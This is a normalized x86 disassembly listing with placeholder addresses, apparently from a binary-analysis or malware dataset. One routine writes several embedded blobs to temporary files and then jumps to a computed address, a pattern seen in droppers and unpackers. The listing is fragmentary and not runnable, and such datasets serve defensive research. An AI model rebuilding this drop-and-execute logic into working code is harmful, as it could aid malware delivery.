jl r-xdata
cmp edx edi
jl r-xdata
mov edx [ ebp - 0x8 ]
cmp edx esi
jl r-xdata
mov edi [ ebp - 0x4 ]
cmp esi [ ebp - 0x8 ]
jl r-xdata
cmp edi esi
jl r-xdata
mov edi [ ebp - 0x8 ]
cmp esi ebx
jl r-xdata
mov edx 0x4
cmp edi esi
jl r-xdata
mov edx 0x4
lea ecx [ eax + 0x1 ]
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x100
mov [ rwxdata ] 0x3
mov [ rwxdata ] ax
mov [ rwxdata ] cl
mov [ rwxdata ] edx
mov [ rwxdata ] rwxdata
mov [ rwxdata ] edx
mov [ rwxdata ] eax
jmp r-xdata
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x8 ]
jl r-xdata
cmp esi ebx
jl r-xdata
cmp edx esi
jl r-xdata
mov ecx 0x1
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x100
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] cl
mov [ rwxdata ] eax
mov [ rwxdata ] rwxdata
mov [ rwxdata ] eax
mov [ rwxdata ] 0x0
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp ebx edi
jl r-xdata
cmp esi 0x40
jl r-xdata
cmp esi 0x40
jge r-xdata
mov [ ebp - 0x10 ] 0x5
mov edx [ ebp - 0x10 ]
mov esi [ ebp - 0x8 ]
cmp edx edi
jl r-xdata
cmp esi edx
jl r-xdata
cmp ebx esi
jl r-xdata
cmp ebx edx
jl r-xdata
cmp edx esi
jl r-xdata
cmp [ ebp - 0xc ] esi
jl r-xdata
cmp edx edi
jl r-xdata
cmp esi [ ebp - 0xc ]
jl r-xdata
mov edx 0x4
mov ecx 0x2
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x100
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] al
mov [ rwxdata ] edx
mov [ rwxdata ] rwxdata
mov [ rwxdata ] edx
mov [ rwxdata ] 0x0
jmp r-xdata
mov edx [ ebp - 0xc ]
cmp edi ebx
jl r-xdata
mov edi [ ebp - 0x8 ]
cmp edi esi
jg r-xdata
mov edx 0x4
mov ecx 0x2
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x100
mov [ rwxdata ] 0x3
mov [ rwxdata ] ax
mov [ rwxdata ] 0x1
mov [ rwxdata ] edx
mov [ rwxdata ] rwxdata
mov [ rwxdata ] edx
mov [ rwxdata ] eax
jmp r-xdata
cmp edi ebx
jl r-xdata
cmp esi edx
jl r-xdata
mov edi eax
mov ecx 0x2
mov [ rwxdata ] edi
mov [ rwxdata ] edi
mov edi [ ebp - 0xc ]
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x100
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] rwxdata
mov [ rwxdata ] 0x0
cmp esi 0x80
jl r-xdata
cmp esi 0x80
jge r-xdata
mov [ ebp - 0x10 ] 0x6
mov edx [ ebp - 0x10 ]
cmp edi edx
jl r-xdata
cmp ebx edi
jl r-xdata
mov esi [ ebp - 0x8 ]
cmp edx esi
jl r-xdata
cmp edi edx
jl r-xdata
cmp esi ebx
jl r-xdata
mov ecx 0x1
mov [ rwxdata ] eax
mov [ rwxdata ] 0x100
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] cl
mov [ rwxdata ] 0x4
mov [ rwxdata ] rwxdata
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov edi 0x4
xor ecx ecx
mov [ rwxdata ] edi
mov [ rwxdata ] edi
mov edi [ ebp - 0x8 ]
mov [ rwxdata ] eax
mov [ rwxdata ] 0x100
mov [ rwxdata ] 0x3
mov [ rwxdata ] cx
mov [ rwxdata ] 0x1
mov [ rwxdata ] rwxdata
mov [ rwxdata ] ecx
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
cmp edx [ ebp - 0x8 ]
jl r-xdata
mov edi [ ebp - 0x4 ]
cmp edx [ ebp - 0xc ]
jl r-xdata
mov ecx 0x3
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x100
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x0
mov [ rwxdata ] al
mov [ rwxdata ] edx
mov [ rwxdata ] rwxdata
mov [ rwxdata ] edx
mov [ rwxdata ] 0x0
cmp esi edi
jl r-xdata
cmp edi [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
jl r-xdata
mov ecx 0x3
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x100
mov [ rwxdata ] ecx
mov [ rwxdata ] ax
mov [ rwxdata ] 0x1
mov [ rwxdata ] edx
mov [ rwxdata ] rwxdata
mov [ rwxdata ] edx
mov [ rwxdata ] eax
jmp r-xdata
mov edx eax
mov ecx 0x3
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x100
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] edx
mov [ rwxdata ] rwxdata
mov [ rwxdata ] edx
mov [ rwxdata ] 0x0
jmp r-xdata
cmp esi 0x100
jl r-xdata
cmp esi 0x100
jge r-xdata
mov [ ebp - 0x10 ] 0x7
mov edx [ ebp - 0x10 ]
cmp esi edx
jl r-xdata
cmp edi ebx
jl r-xdata
cmp ebx esi
jl r-xdata
cmp ebx edx
jl r-xdata
xor ecx ecx
mov esi 0x4
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x100
mov [ rwxdata ] eax
mov [ rwxdata ] cx
mov [ rwxdata ] 0x1
mov [ rwxdata ] esi
mov [ rwxdata ] rwxdata
mov [ rwxdata ] esi
mov [ rwxdata ] ecx
mov edi [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp esi edi
jl r-xdata
cmp edx edi
jl r-xdata
mov ecx 0x4
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x100
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] al
mov [ rwxdata ] ecx
mov [ rwxdata ] rwxdata
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x0
mov ecx 0x4
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x100
mov [ rwxdata ] 0x3
mov [ rwxdata ] ax
mov [ rwxdata ] 0x1
mov [ rwxdata ] ecx
mov [ rwxdata ] rwxdata
mov [ rwxdata ] ecx
mov [ rwxdata ] eax
jmp r-xdata
cmp edi esi
jl r-xdata
mov bl al
and bl 0x4
cmp bl 0x4
sete bl
mov [ rwxdata ] bl
mov bl al
and bl 0x2
cmp bl 0x2
sete bl
mov [ rwxdata ] bl
mov bl cl
and al 0x1
cmp al 0x1
sete al
and bl 0x4
cmp bl 0x4
sete bl
mov [ rwxdata ] bl
mov bl cl
and bl 0x2
cmp bl 0x2
sete bl
and cl 0x1
cmp cl 0x1
sete cl
mov [ rwxdata ] cl
mov ecx [ rwxdata ]
dec ecx
mov [ rwxdata ] bl
mov bl cl
and bl 0x2
cmp bl 0x2
sete bl
and cl 0x1
cmp cl 0x1
sete cl
mov [ rwxdata ] cl
mov ecx [ rwxdata ]
dec ecx
mov [ rwxdata ] bl
mov bl cl
and bl 0x2
cmp bl 0x2
sete bl
and cl 0x1
cmp cl 0x1
sete cl
mov [ rwxdata ] cl
mov ecx [ rwxdata ]
dec ecx
mov [ rwxdata ] bl
mov bl cl
and bl 0x2
cmp bl 0x2
sete bl
and cl 0x1
cmp cl 0x1
sete cl
mov [ rwxdata ] cl
mov ecx [ rwxdata ]
dec ecx
mov [ rwxdata ] bl
mov bl cl
and bl 0x2
cmp bl 0x2
sete bl
and cl 0x1
cmp cl 0x1
sete cl
mov [ rwxdata ] cl
mov ecx [ rwxdata ]
dec ecx
mov [ rwxdata ] bl
mov bl cl
and bl 0x2
cmp bl 0x2
sete bl
mov [ rwxdata ] al
mov eax [ rwxdata ]
mov [ rwxdata ] bl
and cl 0x1
cmp cl 0x1
sete cl
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
movzx ecx [ rwxdata ]
mov [ rwxdata ] cl
mov ecx [ ebp - 0x18 ]
mov esi ecx
and esi 0x1000
cmp esi 0x1000
sete bl
mov [ rwxdata ] bl
mov esi ecx
and esi 0x800
cmp esi 0x800
sete bl
mov [ rwxdata ] bl
mov esi ecx
and esi 0x400
cmp esi 0x400
sete bl
mov [ rwxdata ] bl
mov esi ecx
and esi 0x200
cmp esi 0x200
sete bl
mov [ rwxdata ] bl
mov esi ecx
and esi 0x100
cmp esi 0x100
sete bl
mov [ rwxdata ] bl
mov bl cl
and bl 0x80
cmp bl 0x80
sete bl
mov [ rwxdata ] bl
mov bl cl
and bl 0x40
cmp bl 0x40
sete bl
mov [ rwxdata ] bl
mov [ rwxdata ] 0x24
mov bl cl
and bl 0x20
cmp bl 0x20
sete bl
mov [ rwxdata ] bl
mov bl cl
and bl 0x10
cmp bl 0x10
sete bl
mov [ rwxdata ] bl
mov bl cl
and bl 0x8
cmp bl 0x8
sete bl
mov [ rwxdata ] bl
mov bl cl
and bl 0x4
cmp bl 0x4
sete bl
mov [ rwxdata ] bl
mov bl cl
and bl 0x2
cmp bl 0x2
sete bl
and cl 0x1
cmp cl 0x1
sete cl
mov [ rwxdata ] cl
dec edx
mov cl dl
and cl 0x8
cmp cl 0x8
sete cl
mov [ rwxdata ] cl
mov cl dl
and cl 0x4
cmp cl 0x4
sete cl
mov [ rwxdata ] cl
mov cl dl
and cl 0x2
cmp cl 0x2
sete cl
mov esi 0x11
mov [ rwxdata ] bl
mov [ rwxdata ] cl
mov [ rwxdata ] esi
mov [ rwxdata ] 0x1
test dl 0x1
jne r-xdata
cmp esi 0x200
jge r-xdata
mov [ ebp - 0x10 ] 0x8
mov edx [ ebp - 0x10 ]
cmp esi ebx
jl r-xdata
cmp edi esi
jl r-xdata
mov ecx 0x1
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x100
mov [ rwxdata ] eax
mov [ rwxdata ] 0x0
mov [ rwxdata ] cl
mov [ rwxdata ] 0x4
mov [ rwxdata ] rwxdata
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
cmp edi esi
jl r-xdata
mov ecx 0x3
mov [ rwxdata ] eax
mov [ rwxdata ] 0x100
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x4
mov [ rwxdata ] rwxdata
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
xor ecx ecx
mov edx 0x4
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x100
mov [ rwxdata ] 0x3
mov [ rwxdata ] cx
mov [ rwxdata ] al
mov [ rwxdata ] edx
mov [ rwxdata ] rwxdata
mov [ rwxdata ] edx
mov [ rwxdata ] ecx
add eax 0x35
inc edx
or ebx 0xffffffff
mov [ rwxdata ] eax
mov [ ebp - 0x10 ] edx
xor edi edi
jmp r-xdata
mov [ rwxdata ] 0x0
mov [ ebp - 0x10 ] 0x9
mov edx [ ebp - 0x10 ]
cmp esi edi
jl r-xdata
mov ecx 0x2
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x100
mov [ rwxdata ] eax
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x4
mov [ rwxdata ] rwxdata
mov [ rwxdata ] 0x4
mov [ rwxdata ] 0x0
mov ecx 0x4
mov [ rwxdata ] eax
mov [ rwxdata ] 0x100
mov [ rwxdata ] 0x3
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] ecx
mov [ rwxdata ] rwxdata
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x0
cmp [ edi * 4 + rwxdata ] 0xffffffff
je r-xdata
mov ecx 0x4
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x100
mov [ rwxdata ] eax
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x1
mov [ rwxdata ] ecx
mov [ rwxdata ] rwxdata
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x0
inc edi
cmp edi 0xfa0
jl r-xdata
inc eax
mov [ rwxdata ] eax
cmp ebx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ebx ecx
jge r-xdata
mov ecx edi
sub ecx ebx
sub ecx 0x2
test ecx ecx
jle r-xdata
test edi edi
jle r-xdata
mov edi [ rwxdata ]
xor ecx ecx
test edi edi
jle r-xdata
inc eax
sub ecx ebx
mov [ esi + rwxdata ] 0x0
sub ecx 0x2
mov [ rwxdata ] eax
inc esi
push ecx
mov eax edx
mov [ rwxdata ] esi
call sub_401390
lea esi [ ebx + 0x2 ]
add esp 0x4
cmp esi edi
jge r-xdata
mov eax [ edi * 4 + rwxdata ]
mov [ esi + rwxdata ] 0x1
inc esi
push eax
mov [ rwxdata ] esi
call sub_401910
mov [ esi + rwxdata ] 0x0
inc esi
push ecx
mov eax edx
mov [ rwxdata ] esi
call sub_401390
lea esi [ ebx + 0x2 ]
add esp 0x4
cmp esi edi
jge r-xdata
mov [ esi + rwxdata ] 0x0
inc esi
push edi
mov eax edx
mov [ rwxdata ] esi
call sub_401390
add esp 0x4
xor esi esi
test edi edi
jle r-xdata
xor ecx ecx
test esi esi
jle r-xdata
lea edx [ edi - 0x1 ]
jmp r-xdata
mov eax [ rwxdata ]
mov esi [ rwxdata ]
mov edx [ rwxdata ]
mov ecx edi
sub ecx esi
lea eax [ edx + ecx * 8 ]
mov [ rwxdata ] eax
nop
mov eax [ edi * 4 + rwxdata ]
push eax
call sub_401910
mov esi [ rwxdata ]
jmp r-xdata
mov edx [ rwxdata ]
mov ecx edi
sub ecx esi
lea eax [ edx + ecx * 8 ]
mov [ rwxdata ] eax
mov edx [ rwxdata ]
lea eax [ edx + edi * 8 ]
mov [ rwxdata ] eax
mov edi edi
mov ebx [ rwxdata ]
mov [ rwxdata ] 0x0
cmp ebx 0xc8
jge r-xdata
lea edx [ esi - 0x1 ]
cmp ecx edx
je r-xdata
mov ebx [ esi * 4 + rwxdata ]
call sub_4012c0
inc esi
cmp esi edi
jl r-xdata
mov eax [ rwxdata ]
mov edx [ ebp - 0x10 ]
add esp 0x4
mov ebx edi
mov ebx [ esi * 4 + rwxdata ]
call sub_4012c0
inc esi
cmp esi edi
jl r-xdata
jmp r-xdata
mov ebx [ esi * 4 + rwxdata ]
call sub_4012c0
inc esi
cmp esi edi
jl r-xdata
mov edi [ rwxdata ]
test edi edi
jne r-xdata
cmp [ ebp - 0x28 ] 0xffffffff
jne r-xdata
inc ecx
cmp ecx edx
je r-xdata
inc ecx
cmp ecx edx
je r-xdata
xor edx edx
test ebx ebx
jle r-xdata
test ebx ebx
jle r-xdata
mov edx [ rwxdata ]
xor esi esi
cmp edx esi
jne r-xdata
inc ecx
cmp ecx edx
je r-xdata
inc ecx
cmp ecx edx
je r-xdata
xor ecx ecx
xor ebx ebx
mov [ rwxdata ] ecx
cmp [ rwxdata ] ecx
jle r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
mov esi rwxdata
mov edi rwxdata
[ edi ] [ esi ]
mov edi [ rwxdata ]
jmp r-xdata
lea ecx [ edx + edx * 2 ]
add ecx ecx
add ecx ecx
mov edi [ ecx + ecx + rwxdata ]
add ecx ecx
mov [ ecx + rwxdata ] edi
mov [ ecx + rwxdata ] esi
mov edi [ ecx + rwxdata ]
mov [ ecx + rwxdata ] edi
mov [ ecx + rwxdata ] esi
mov edi [ ecx + rwxdata ]
inc edx
mov [ ecx + rwxdata ] edi
mov [ ecx + rwxdata ] esi
mov [ rwxdata ] edx
mov [ rwxdata ] esi
mov [ rwxdata ] esi
mov [ rwxdata ] esi
mov [ rwxdata ] esi
mov [ rwxdata ] esi
mov [ rwxdata ] esi
mov [ rwxdata ] 0x1
jmp r-xdata
inc ecx
cmp ecx edx
je r-xdata
inc ecx
cmp ecx edx
je r-xdata
xor edx edx
test ecx ecx
jle r-xdata
xor edx edx
test edi edi
jle r-xdata
xor ecx ecx
test edi edi
jle r-xdata
mov [ rwxdata ] edi
cdq
and edx 0x7
add eax edx
pop edi
sar eax 0x3
add [ rwxdata ] eax
mov eax [ ebp - 0x28 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc ecx
cmp ecx edx
je r-xdata
inc ecx
cmp ecx edx
je r-xdata
mov [ rwxdata ] 0x0
lea esi [ ecx - 0x1 ]
cmp edx edi
je r-xdata
mov esi [ ebx * 4 + rwxdata ]
nop
cmp ecx edi
jne r-xdata
mov esi [ edx * 4 + rwxdata ]
lea ecx [ ecx ]
inc ecx
cmp ecx edx
je r-xdata
inc ecx
cmp ecx edx
je r-xdata
inc edx
cmp edx esi
je r-xdata
inc ebx
cmp ebx [ rwxdata ]
jl r-xdata
test edx 0x1000
je r-xdata
inc edx
cmp edx edi
jl r-xdata
inc edx
cmp edx ebx
jl r-xdata
mov ecx [ edx * 4 + rwxdata ]
mov [ edi * 4 + rwxdata ] ecx
inc edi
inc ecx
cmp ecx edi
jl r-xdata
inc ecx
cmp ecx edx
je r-xdata
inc ecx
cmp ecx edx
je r-xdata
inc edx
cmp edx esi
je r-xdata
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
mov [ ecx + rwxdata ] 0x0
mov [ ecx + rwxdata ] 0x1
jmp r-xdata
cmp [ edx * 4 + rwxdata ] esi
je r-xdata
cmp [ ecx * 4 + rwxdata ] esi
je r-xdata
add ecx 0x2
cmp ecx esi
jl r-xdata
add ecx 0x2
cmp ecx edi
jl r-xdata
inc edx
cmp edx esi
je r-xdata
mov [ ecx + rwxdata ] 0x0
mov [ ecx + rwxdata ] 0x1
jmp r-xdata
inc ecx
test edx 0x800
je r-xdata
cmp ecx edx
je r-xdata
inc edx
cmp edx esi
je r-xdata
mov [ ecx + rwxdata ] 0x0
mov [ ecx + rwxdata ] 0x1
jmp r-xdata
inc ecx
test edx 0x400
je r-xdata
inc edx
cmp edx esi
je r-xdata
mov [ ecx + rwxdata ] 0x0
mov [ ecx + rwxdata ] 0x1
jmp r-xdata
inc ecx
test edx 0x200
je r-xdata
inc edx
cmp edx esi
je r-xdata
mov [ ecx + rwxdata ] 0x0
mov [ ecx + rwxdata ] 0x1
jmp r-xdata
inc ecx
test edx 0x100
je r-xdata
add edx 0x2
cmp edx ecx
jl r-xdata
mov [ ecx + rwxdata ] 0x0
mov [ ecx + rwxdata ] 0x1
jmp r-xdata
inc ecx
test dl dl
jns r-xdata
cmp edx esi
je r-xdata
mov [ ecx + rwxdata ] 0x0
mov [ ecx + rwxdata ] 0x1
jmp r-xdata
inc ecx
test dl 0x40
je r-xdata
mov [ ecx + rwxdata ] 0x0
mov [ ecx + rwxdata ] 0x1
jmp r-xdata
inc ecx
test dl 0x20
je r-xdata
mov [ ecx + rwxdata ] 0x0
mov [ ecx + rwxdata ] 0x1
jmp r-xdata
inc ecx
test dl 0x10
je r-xdata
mov [ ecx + rwxdata ] 0x0
mov [ ecx + rwxdata ] 0x1
jmp r-xdata
inc ecx
test dl 0x8
je r-xdata
mov [ ecx + rwxdata ] 0x0
mov [ ecx + rwxdata ] 0x1
jmp r-xdata
inc ecx
test dl 0x4
je r-xdata
mov [ ecx + rwxdata ] 0x0
mov [ ecx + rwxdata ] 0x1
jmp r-xdata
inc ecx
test dl 0x2
je r-xdata
mov [ ecx + rwxdata ] 0x0
mov [ ecx + rwxdata ] 0x1
jmp r-xdata
inc ecx
test dl 0x1
je r-xdata
inc ecx
add eax 0xd
sub_403280
push ebp
mov ebp esp
sub esp 0x12c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0xc ] eax
push esi
push edi
cmp [ rwxdata ] 0x64
jge r-xdata
mov [ ebp - 0x120 ] 0x0
mov [ ebp - 0x128 ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
call sub_403280
mov eax [ rwxdata ]
sub eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ rwxdata ] 0x0
mov ecx [ ebp - 0x128 ]
push ecx
call sub_401cc0
add esp 0x4
mov [ ebp - 0x128 ] eax
mov edx [ ebp - 0x120 ]
add edx 0x1
mov [ ebp - 0x120 ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
cmp [ ebp - 0x128 ] 0xffffffff
je r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x8 ]
imul edx edx 0x18
mov eax [ ebp - 0x8 ]
imul eax eax 0x18
mov ecx [ edx + rwxdata ]
cmp ecx [ eax + rwxdata ]
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ rwxdata ]
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
imul edx edx 0x18
mov eax [ ebp - 0x8 ]
imul eax eax 0x18
mov ecx [ edx + rwxdata ]
mov [ eax + rwxdata ] ecx
mov [ rwxdata ] 0x0
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ rwxdata ]
jge r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0xf
jmp r-xdata
cmp [ rwxdata ] 0x64
jge r-xdata
mov [ ebp - 0x11c ] 0x0
mov eax [ ebp - 0x8 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
lea eax [ ebp - 0x118 ]
push eax
push 0x103
call [ GetTempPathA@IAT ]
push rwxdata
push 0x0
push r--data
lea ecx [ ebp - 0x118 ]
push ecx
call [ GetTempFileNameA@IAT ]
push r--data
push rwxdata
call sub_405ba3
add esp 0x8
mov [ ebp - 0x124 ] eax
mov edx [ ebp - 0x124 ]
push edx
push 0x4af3
push 0x1
push rwxdata
call sub_405d58
add esp 0x10
mov eax [ ebp - 0x124 ]
push eax
call sub_40613e
add esp 0x4
push rwxdata
push 0x0
push r--data
lea ecx [ ebp - 0x118 ]
push ecx
call [ GetTempFileNameA@IAT ]
push r--data
push rwxdata
call sub_405ba3
add esp 0x8
mov [ ebp - 0x124 ] eax
mov edx [ ebp - 0x124 ]
push edx
push 0x22dce
push 0x1
push rwxdata
call sub_405d58
add esp 0x10
mov eax [ ebp - 0x124 ]
push eax
call sub_40613e
add esp 0x4
push rwxdata
push 0x0
push r--data
lea ecx [ ebp - 0x118 ]
push ecx
call [ GetTempFileNameA@IAT ]
push r--data
push rwxdata
call sub_405ba3
add esp 0x8
mov [ ebp - 0x124 ] eax
mov edx [ ebp - 0x124 ]
push edx
push 0xadb4
push 0x1
push rwxdata
call sub_405d58
add esp 0x10
mov eax [ ebp - 0x124 ]
push eax
call sub_40613e
add esp 0x4
push rwxdata
push 0x0
push r--data
lea ecx [ ebp - 0x118 ]
push ecx
call [ GetTempFileNameA@IAT ]
push r--data
push rwxdata
call sub_405ba3
add esp 0x8
mov [ ebp - 0x124 ] eax
mov edx [ ebp - 0x124 ]
push edx
push 0x528
push 0x1
push rwxdata
call sub_405d58
add esp 0x10
mov eax [ ebp - 0x124 ]
push eax
call sub_40613e
add esp 0x4
push rwxdata
push 0x0
push r--data
lea ecx [ ebp - 0x118 ]
push ecx
call [ GetTempFileNameA@IAT ]
push r--data
push rwxdata
call sub_405ba3
add esp 0x8
mov [ ebp - 0x124 ] eax
mov edx [ ebp - 0x124 ]
push edx
push 0x14c2
push 0x1
push rwxdata
call sub_405d58
add esp 0x10
mov eax [ ebp - 0x124 ]
push eax
call sub_40613e
add esp 0x4
call sub_4046f0
push rwxdata
call sub_405aac
add esp 0x4
push rwxdata
call sub_405aac
add esp 0x4
push rwxdata
call sub_405aac
add esp 0x4
push rwxdata
call sub_405aac
add esp 0x4
push rwxdata
call sub_405aac
add esp 0x4
mov esp [ rwxdata ]
mov ebp [ rwxdata ]
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
mov esi [ rwxdata ]
mov edi [ rwxdata ]
lea eax [ rwxdata ]
jmp eax
xor eax eax
jmp r-xdata
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov edx [ ebp - 0x11c ]
or edx 0x80
mov [ ebp - 0x11c ] edx
jmp r-xdata
mov ecx 0xf
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ edx * 4 + rwxdata ]
shl eax cl
sar eax 0xf
and eax 0x1
je r-xdata
pop edi
pop esi
mov ecx [ ebp - 0xc ]
xor ecx ebp
call sub_405894
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x8 ] edx
jne r-xdata
mov ecx [ ebp - 0x11c ]
or ecx 0x40
mov [ ebp - 0x11c ] ecx
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x8 ] ecx
jne r-xdata
mov eax [ ebp - 0x11c ]
or eax 0x20
mov [ ebp - 0x11c ] eax
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
jmp r-xdata
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov edx [ ebp - 0x11c ]
or edx 0x10
mov [ ebp - 0x11c ] edx
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x8 ] edx
jne r-xdata
mov ecx [ ebp - 0x11c ]
or ecx 0x8
mov [ ebp - 0x11c ] ecx
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x8 ] ecx
jne r-xdata
mov eax [ ebp - 0x11c ]
or eax 0x4
mov [ ebp - 0x11c ] eax
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
jmp r-xdata
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov edx [ ebp - 0x11c ]
or edx 0x2
mov [ ebp - 0x11c ] edx
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov ecx [ ebp - 0x11c ]
or ecx 0x1
mov [ ebp - 0x11c ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ rwxdata ]
jge r-xdata
sub_4038c0
mov eax ebx
and eax 0x80
xor dl dl
cmp al 0x80
mov eax [ rwxdata ]
mov ecx 0x1
jne r-xdata
